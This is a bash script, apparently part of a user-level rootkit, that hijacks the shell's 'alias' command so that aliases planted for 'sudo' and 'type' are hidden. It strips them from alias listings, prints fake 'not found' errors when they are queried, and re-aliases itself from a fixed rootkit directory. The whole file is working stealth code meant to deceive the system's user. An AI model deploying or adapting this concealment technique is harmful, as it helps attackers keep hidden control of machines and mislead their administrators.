#!/bin/bash

# Rootkit alias: alias all the way down

#shopt -s expand_aliases
#source ~/.bashrc


# since this script is an alias for alias,
# we have to unalias alias before we run alias :)
# After that, we can re-alias alias. Hopefully they don't ctrl-C
# at the right time between alias and alias alias though!
# This has the added bonus that we don't have to hide the fact that we alias'd alias
# (at least, from alias. we will for `type`)
unalias alias
aliasout=`alias $@`


if [ $# -eq 0 ];
then
    # listing all alias, just delete the lines we are hiding (e.g. sudo)
    echo "$aliasout" \
        | grep -E -v '^alias sudo=' \
        | grep -E -v '^alias type='
else
    echo -n "$aliasout" \
        | sed '/^alias sudo=/c\-bash: alias: sudo: not found' \
        | sed '/^alias type=/c\-bash: alias: type: not found'
fi

alias alias='source /home/ubuntu/ulrk/rk-alias.sh $1'
# TODO we need a temporary fixed rootkit directory
